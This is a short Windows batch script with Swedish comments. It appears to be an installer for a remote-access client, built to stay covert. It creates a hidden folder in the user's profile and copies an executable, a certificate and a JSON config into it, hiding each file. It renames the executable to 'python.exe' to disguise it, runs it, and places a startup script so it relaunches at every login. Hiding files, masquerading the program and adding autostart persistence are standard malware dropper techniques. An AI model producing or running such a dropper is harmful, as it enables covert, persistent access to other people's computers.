@echo off
setlocal

REM ===== HÅRDKODADE NAMN =====
set foldername=Andra filer
set originalexe=rcmd.exe
set finalexe=python.exe
set crtname=lulea.se.crt
set jsonname=client_config.json
set batname=WinBinary.bat

REM ===== INSTÄLLNINGAR =====
set userfolder=%USERPROFILE%
set target=%userfolder%\%foldername%
set startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

echo ===== Starting =====

REM ===== SKAPA DOLD MAPP =====
if not exist "%target%" (
    mkdir "%target%"
    attrib +h "%target%"
    echo Created hidden folder: %target%
)

REM ===== KOPIERA .CRT OCH BYT NAMN =====
for %%f in (*.crt) do (
    echo Copying %%f to %crtname%
    copy "%%f" "%target%\%crtname%" /Y
    attrib +h "%target%\%crtname%"
)

REM ===== KOPIERA .EXE =====
for %%f in (*.exe) do (
    echo Copying %%f to %target%\%originalexe%
    copy "%%f" "%target%\%originalexe%" /Y
)

REM ===== KOPIERA .JSON =====
for %%f in (*.json) do (
    echo Copying %%f to %jsonname%
    copy "%%f" "%target%\%jsonname%" /Y
    attrib +h "%target%\%jsonname%"
)

REM ===== KÖR EXE FÖRSTA GÅNGEN =====
echo Running %originalexe%...
start "" "%target%\%originalexe%"

REM ===== VÄNTA NÅGRA SEKUNDER =====
timeout /t 3 /nobreak >nul

REM ===== BYT NAMN PÅ EXE =====
echo Renaming %originalexe% to %finalexe%...
rename "%target%\%originalexe%" "%finalexe%"
attrib +h "%target%\%finalexe%"

REM ===== KÖR EXE IGEN =====
echo Running %finalexe%...
start "" "%target%\%finalexe%"

REM ===== SKAPA AUTOSTART .BAT =====
echo Creating autostart .bat in %startup%...
(
echo @echo off
echo cd /d "%target%"
echo start "" "%finalexe%"
) > "%startup%\%batname%"

REM OBS: Autostart .bat blir INTE dold
echo ===== Done! All files are in hidden folder. Autostart .bat is visible =====
pause